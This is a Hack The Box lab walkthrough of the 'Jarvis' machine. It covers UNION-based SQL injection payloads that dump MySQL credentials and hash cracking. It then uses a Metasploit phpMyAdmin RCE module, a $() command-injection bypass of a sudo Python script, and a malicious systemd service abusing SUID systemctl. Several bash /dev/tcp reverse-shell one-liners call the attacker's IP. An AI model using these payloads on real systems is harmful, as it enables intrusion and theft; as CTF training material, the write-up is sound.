# Jarvis - Medium

Target IP: **10.129.229.137**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.229.137 -v```

Output shows standard port 22 for ssh, port 80 and 64999 running Apache 2.4.25.

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's navigate to the webpage. We are greeted with this front page.

![1](Screenshots/J_1.jpg)

It seems like the login button doesn't do anything.

We see ```supersecurehotel.htb```, so let's add it to our ```/etc/hosts``` file.

Navigating to port 64999 shows this weird message, but nothing else.

![2](Screenshots/J_2.jpg)

Let's enumerate further.

We get some hits from fuzzing directories.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-8j15agp1rz]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://supersecurehotel.htb/FUZZ -ic -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://supersecurehotel.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

adminqcXWQhOg           [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 13ms]
                        [Status: 200, Size: 23628, Words: 3014, Lines: 544, Duration: 20ms]
css                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 12ms]
js                      [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 13ms]
fonts                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 13ms]
phpmyadmin              [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 13ms]
                        [Status: 200, Size: 23628, Words: 3014, Lines: 544, Duration: 18ms]
sass                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 12ms]
:: Progress: [87651/87651] :: Job [1/1] :: 101 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

Navigating to ```/phpmyadmin``` shows us a log in page for phpmyadmin.

![3](Screenshots/J_3/jpg)

Trying to log in with common credentials, we see that the error is returned to us. This makes me believe that this is vulnerable to SQLi.

![4](Screenshots/J_4.jpg)

Actually, this doesn't seem like it's performing queries directly against the database, but using the mysql binary itself to log in, as the error message seems similar. We should look somewhere else.

There's interesting behavior being shown by ```/room.php``` on the main website.

It takes in a parameter named ```cod``` then returns information about the room, like a picture, cost, etc.

![5](Screenshots/J_5.jpg)

We can freely change the parameter and the page still loads. Setting ```cod``` equal to 100, we don't get anything.

![6](Screenshots/J_6.jpg)

This behavior makes me believe the parameter is the id for specific rooms that are stored in a table. There is a back-end query that matches the id that is passed in, and if the entry exists in the table, it returns to us all the contents of it.

To exploit this, we need to find out how many columns are in our current table first.

The payload ```cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -``` works. It shows our numbers on the appropriate spot where the elements of the entry are displayed.

![7](Screenshots/J_7.jpg)

We can start exploiting this now. Let's check what database we are currently in.

We are in the ```hotel``` database.

![8](Screenshots/J_8.jpg)

We can use ```GROUP_CONCAT()``` to get all the values in different rows into one string.

With this payload, we can see all the databases: ```cod=100 UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3,4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -```

The ```mysql``` database seems the most interesting.

![9](Screenshots/J_9.jpg)

Let's get all the tables from the ```mysql``` database with this payload: ```cod=100 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6,7 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'mysql';-- -```

The output is long so we can't see it all on the page, but we can go into the page source.

![10](Screenshots/J_10.jpg)

The ```user``` table seems like what we are looking for.

Let's get the columns in the table: ```cod=100 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),GROUP_CONCAT(TABLE_NAME),GROUP_CONCAT(TABLE_SCHEMA),5,6,7 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'user';-- -```

There is a ```user``` and ```password``` column.

![11](Screenshots/J_11.jpg)

Finally, we can retrieve the values: ```cod=100 UNION SELECT 1,GROUP_CONCAT(USER),GROUP_CONCAT(PASSWORD),4,5,6,7 from mysql.user;-- -```

![12](Screenshots/J_12.jpg)

There is a set of credentials, ```DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0```.

I'm guessing we can use these credentials to log in to phpmyadmin.

Logging in doesn't work. It might be a hash we need to crack.

Hashcat says that this hash could possibly be in a variety of formats, but since this is for mysql, I'm guessing it is ```-m 300```.

```
The following 7 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    100 | SHA1                                                       | Raw Hash
   6000 | RIPEMD-160                                                 | Raw Hash
    170 | sha1(utf16le($pass))                                       | Raw Hash
   4700 | sha1(md5($pass))                                           | Raw Hash salted and/or iterated
  18500 | sha1(md5(md5($pass)))                                      | Raw Hash salted and/or iterated
   4500 | sha1(sha1($pass))                                          | Raw Hash salted and/or iterated
    300 | MySQL4.1/MySQL5                                            | Database Server
```

We successfully crack the hash.

```
2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
```

Let's log in now.

We're in! We can see the version of phpmyadmin, 4.8.0.

![13](Screenshots/J_13.jpg)

Let's look for publicly disclosed vulnerabilities. This is vulnerable to CVE-2018-12613, a LFI vulnerability that can be changed to achieve RCE.

I haven't used Metasploit in forever, so let's try that. There is a module designed for this vulnerability.

```
4  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
```

Let's select it and set our options.

```
[msf](Jobs:0 Agents:0) >> use 4
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set USERNAME DBadmin
USERNAME => DBadmin
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set PASSWORD imissyou
PASSWORD => imissyou
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set RHOSTS http://supersecurehotel.htb
RHOSTS => http://supersecurehotel.htb
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set LHOST 10.10.15.194
LHOST => 10.10.15.194
```

We get a shell as ```www-data```.

```
[msf](Jobs:0 Agents:1) exploit(multi/http/phpmyadmin_lfi_rce) >> exploit
[*] Started reverse TCP handler on 10.10.15.194:4444 
[*] Sending stage (42137 bytes) to 10.129.229.137
[*] Meterpreter session 2 opened (10.10.15.194:4444 -> 10.129.229.137:33122) at 2026-09-30 14:40:35 -0400
[-] 10.129.229.137:80 - Failed to drop database myxbh. Might drop when your session closes.

(Meterpreter 2)(/usr/share/phpmyadmin) > shell
Process 1885 created.
Channel 0 created.
whoami
www-data
```

We can run a python script as the ```pepper``` user.

```
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Let's look at it. It seems to be a simple script that we can list and ping IPs.

```
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

The ping option looks interesting. When the script is called with ```-p```, the ```exec_ping()``` function runs.

The command that we specify is used to make a system call. There seems to be a command injection flaw, but the function deliberately checks through common characters. One that the blacklist forgets is subshell execution with ```$()```. We want to inject a reverse shell oneliner, but with the forbidden characters we can't directly write it out on the command, but we can just write it in a file.

```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

Let's try it. First, we create a file containing the code that we want to run.

```
cd /tmp
pwd
/tmp
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'" > hi
cat hi
bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'
```

Then, we can run the python script as ```pepper```, specifying the ping option. After supplying our file inside ```$()```, we catch a shell as ```pepper```.

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/tmp/hi)
```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-8j15agp1rz]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.137 33138
bash: cannot set terminal process group (572): Inappropriate ioctl for device
bash: no job control in this shell
pepper@jarvis:/tmp$ whoami
whoami
pepper
```

We can proceed to get the user flag from here.

## Root Flag

There is an unusual directory inside ```home/pepper```.

```
pepper@jarvis:~$ ls
Web  user.txt
```

Inside of it, there seems to be logs of our fuzzing attempt way earlier. This is probably because there was a firewall, which explains port 64999 with the weird message telling us that we were blocked for 90 seconds. However, this isn't really a clear vector.

```
pepper@jarvis:~/Web$ ls -la
total 12
drwxr-xr-x 3 pepper pepper 4096 May  9  2022 .
drwxr-xr-x 4 pepper pepper 4096 May  9  2022 ..
drwxr-xr-x 2 pepper pepper 4096 Sep 30 11:14 Logs
pepper@jarvis:~/Web$ cd Logs
pepper@jarvis:~/Web/Logs$ ls -la
total 16
drwxr-xr-x 2 pepper pepper 4096 Sep 30 11:14 .
drwxr-xr-x 3 pepper pepper 4096 May  9  2022 ..
-rw-r--r-- 1 root   root   8131 Sep 30 11:14 10.10.15.194.txt
pepper@jarvis:~/Web/Logs$ cat 10.10.15.194.txt
10.10.15.194
-------------
Attack 1 : Level 2 : 2026-Sep-30 11:14:08 : GET /order HTTP/1.1

Attack 2 : Level 2 : 2026-Sep-30 11:14:09 : GET /orders HTTP/1.1

Attack 3 : Level 1 : 2026-Sep-30 11:14:10 : GET /\' HTTP/1.1

Attack 4 : Level 2 : 2026-Sep-30 11:14:10 : GET /camcorders HTTP/1.1

Attack 5 : Level 2 : 2026-Sep-30 11:14:11 : GET /ordering HTTP/1.1

Attack 6 : Level 2 : 2026-Sep-30 11:14:12 : GET /border HTTP/1.1
```

Looking at SUID bit binaries, ```systemctl``` seems interesting.

```
pepper@jarvis:~$ find / -perm -4000 -type f 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

On GTFOBins, it tells us that we can create and run a malicious systemd service.

Let's try it.

First, we create a malicious service file that contains a command to initiate a connection back to us.

```
pepper@jarvis:/dev/shm$ cat hi.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.194/4445 0>&1"
[Install]
WantedBy=multi-user.target
```

Then, we issue these two commands to start our service.

```
pepper@jarvis:~$ systemctl link /dev/shm/hi.service
Created symlink /etc/systemd/system/hi.service -> /dev/shm/hi.service.
pepper@jarvis:/dev/shm$ systemctl start /dev/shm/hi.service
```

We get a connection back as ```root```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-8j15agp1rz]─[~]
└──╼ [★]$ nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.229.137 46870
bash: cannot set terminal process group (25251): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# whoami
whoami
root
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
